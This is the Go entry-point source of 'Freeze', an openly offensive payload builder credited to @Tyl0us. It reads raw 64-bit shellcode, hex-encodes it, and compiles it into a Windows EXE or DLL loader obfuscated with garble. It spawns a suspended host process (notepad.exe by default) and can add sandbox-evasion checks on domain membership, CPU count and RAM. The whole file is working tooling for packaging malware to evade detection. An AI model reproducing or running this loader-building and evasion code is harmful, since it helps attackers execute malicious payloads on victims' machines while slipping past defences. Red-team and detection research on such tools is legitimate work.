package main

import (
	"Freeze/Loader"
	"Freeze/Utils"
	"bytes"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
)

type FlagOptions struct {
	outFile   string
	inputFile string
	console   bool
	sandbox   bool
	Sha       bool
	process   string
	export    string
}

func options() *FlagOptions {
	outFile := flag.String("O", "", "Name of output file (e.g. loader.exe or loader.dll). Depending on what file extension defined will determine if Freeze makes a dll or exe.")
	inputFile := flag.String("I", "", "Path to the raw 64-bit shellcode.")
	console := flag.Bool("console", false, "Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.")
	Sha := flag.Bool("sha256", false, "Provides the SHA256 value of the loaders (This is useful for tracking)")
	process := flag.String("process", "notepad.exe", "The name of process to spawn. This process has to exist in C:\\Windows\\System32\\. Example 'notepad.exe'")
	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion by checking:
	Is Endpoint joined to a domain?
	Does the Endpoint have more than 2 CPUs?
	Does the Endpoint have more than 4 gigs of RAM?`)
	export := flag.String("export", "", "For DLL Loaders Only - Specify a specific Export function for a loader to have.")
	flag.Parse()
	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, console: *console, Sha: *Sha, sandbox: *sandbox, process: *process, export: *export}
}

func execute(opt *FlagOptions, name string, mode string) {
	bin, _ := exec.LookPath("env")
	var compiledname string
	var cmd *exec.Cmd
	if mode == "dll" {
		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "../.lib/garble", "-seed=random", "build", "-o", ""+name+"", "-buildmode=c-shared")
	} else {
		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "../.lib/garble", "-seed=random", "build", "-o", ""+name)
	}
	fmt.Println("[*] Compiling Payload")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("%s: %s\n", err, stderr.String())
	}
	os.Chdir("..")
	os.Rename(name+"fldr/"+name, name)
	os.RemoveAll(name + "fldr/")
	fmt.Println("[+] Payload " + name + " Compiled")

	if opt.Sha == true {
		Utils.Sha256(compiledname)
	}
}

func main() {
	fmt.Println(` 
	___________                                    
	\_   _____/______   ____   ____ ________ ____  
	 |    __) \_  __ \_/ __ \_/ __ \\___   // __ \ 
	 |     \   |  | \/\  ___/\  ___/ /    /\  ___/ 
	 \___  /   |__|    \___  >\___  >_____ \\___  >
	     \/                \/     \/      \/    \/ 
		 			(@Tyl0us)
	Soon they will learn that revenge is a dish... best served COLD...				
		 `)
	Utils.Version()
	opt := options()

	if opt.inputFile == "" {
		log.Fatal("Error: Please provide a path to a file containing raw 64-bit shellcode (i.e .bin files)")
	}

	if strings.HasSuffix(opt.outFile, "dll") == false && opt.export != "" {
		log.Fatal("Error: Export option can only be used with DLL loaders ")
	}

	if strings.HasSuffix(opt.outFile, "exe") == false && strings.HasSuffix(opt.outFile, "dll") == false {
		log.Fatal("Error: Bad file extension")
	}
	Utils.CheckGarble()
	var mode string
	src, _ := ioutil.ReadFile(opt.inputFile)
	shellcodeencoded := hex.EncodeToString(src)

	if strings.HasSuffix(opt.outFile, "dll") == true {
		mode = "dll"
	} else {
		mode = ".exe"
	}
	if opt.export != "" {
		fmt.Println("[!] Added an additional Export function called: " + opt.export)
	}
	fmt.Println("[!] Selected Process to Suspend: " + opt.process)
	name := Loader.CompileFile(shellcodeencoded, opt.outFile, opt.console, mode, opt.export, opt.sandbox, opt.process)
	execute(opt, name, mode)

}
